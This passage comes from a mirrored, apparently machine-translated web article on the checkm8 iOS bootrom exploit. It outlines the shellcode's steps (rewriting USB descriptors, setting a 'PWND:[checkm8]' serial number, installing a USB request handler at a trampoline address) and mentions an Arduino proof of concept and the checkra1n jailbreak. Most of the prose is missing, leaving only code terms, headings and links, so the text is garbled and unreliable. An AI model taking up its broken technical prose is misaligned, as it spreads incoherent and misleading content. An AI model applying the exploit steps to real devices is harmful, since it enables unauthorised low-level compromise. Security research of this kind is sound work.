id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p>    <code>shellcode</code> . </p><br><p>  ,   <code>callback-chain</code> —   <code>WXN</code>     <code>shellcode</code>  <code>RW</code> -. </p><br><h2 id="6-ispolnenie-shellcode"> 6.  <code>shellcode</code> </h2><br><p>  <code>shellcode</code>   <code>src/checkm8_arm64.S</code>   : </p><br><h4 id="61-perezapis-konfiguracionnyh-usb-deskriptorov">  6.1.   <code>USB</code> - </h4><br><p>          <code>usb_core_hs_configuration_descriptor</code>  <code>usb_core_fs_configuration_descriptor</code> ,   .        .         <code>USB</code> -, <code>shellcode</code>  . </p><br><h4 id="62-izmenenie-usbserialnumber">  6.2.  <code>USBSerialNumber</code> </h4><br><p>   -   ,     <code>" PWND:[checkm8]"</code> .     ,    . </p><br><h4 id="63-perezapis-ukazatelya-obrabotchika-usb-zaprosov-na-novyy">  6.3.    <code>USB</code> -   </h4><br><p>     <code>USB</code> -       ,        . </p><br><h4 id="64-kopirovanie-obrabotchika-usb-zaprosov-v-trampoline-oblast-pamyati-0x1800afc00"> 6.4.   <code>USB</code> -  <code>TRAMPOLINE</code>   ( <code>0x1800AFC00</code> ) </h4><br><p>   <code>USB</code> -    <code>wValue</code>   <code>0xffff</code> ,    ,     .   ,         : <code>memcpy</code> , <code>memset</code>  <code>exec</code> (      ). </p><br><p>       . </p><br><h2 id="realizaciya-eksployta-na-bolee-nizkom-urovne-raboty-s-usb">         USB </h2><br><p>             <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="> Proof-of-Concept</a>  <code>checkm8</code>  <code>Arduino</code>  <code>Usb Host Shield</code> . PoC    <code>iPhone 7</code> ,         .   <code>iPhone 7</code>  <code>DFU</code>   <code>Usb Host Shield</code>       ,      <code>PWND:[checkm8]</code> ,       <code>USB</code> -         <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ipwndfu</a> ( ,  -  ..).     ,       ,       <code>USB</code> -.      <a href="">USB_Host_Shield_2.0</a> .    , patch-    . </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="vmesto-zaklyucheniya">   </h2><br><p>       .    <code>checkm8</code>   . ,               .          jailbreak-. ,     jailbreak   <code>checkm8</code> — <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">checkra1n</a> .    ,  jailbreak       ( <code>A5</code>  <code>A11</code> )    <code>iOS</code> .      <code>iWatch</code> , <code>Apple TV</code>    . ,             . </p><br><p>  jailbreak,         Apple.   <code>checkm8</code>    verbose- <code>iOS</code> ,  <code>SecureROM</code>   <code>GID</code> -    .   ,   ,           <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="> JTAG/SWD </a> .        , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">    </a> ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="> </a> . ,   <code>checkm8</code> ,  <code>Apple</code>      . </p><br><h2 id="ssylki">  Referensi </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="> ipwndfu  LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id471668/">https://habr.com/ru/post/id471668/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id471658/index.html">Penipu telepon. Tindakan pertama di mana saya diberitahu tentang scammers lainnya</a></li>
<li><a href="../id471660/index.html">Kuliah Psikologi Pemain</a></li>
<li><a href="../id471662/index.html">Web - otentikasi javascript, kebingungan dan kode asli. Pemecahan masalah dengan r0ot-mi Web - Client. Bagian 1</a></li>
<li><a href="../id471664/index.html">Magang di ABBYY: perusahaan tempat Anda bisa menjadi "Anda"</a></li>
<li><a href="../id471666/index.html">Alami pengalaman Pengembang iOS pindah ke Jerman dengan visa kerja</a></li>
<li><a href="../id471670/index.html">Mencoba Jetpack Compose dalam pertempuran?</a></li>
<li><a href="../id471676/index.html">Penipu telepon. Tindakan kedua, di mana saya mogok dan lari ke ATM terdekat</a></li>
<li><a href="../id471678/index.html">Beruang layanan sesuai permintaan</a></li>
<li><a href="../id471684/index.html">Mengapa Anda perlu membuat modul untuk nginx</a></li>
<li><a href="../id471686/index.html">Bagaimana AWS mengolah layanannya yang tangguh. Penskalaan server dan basis data</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>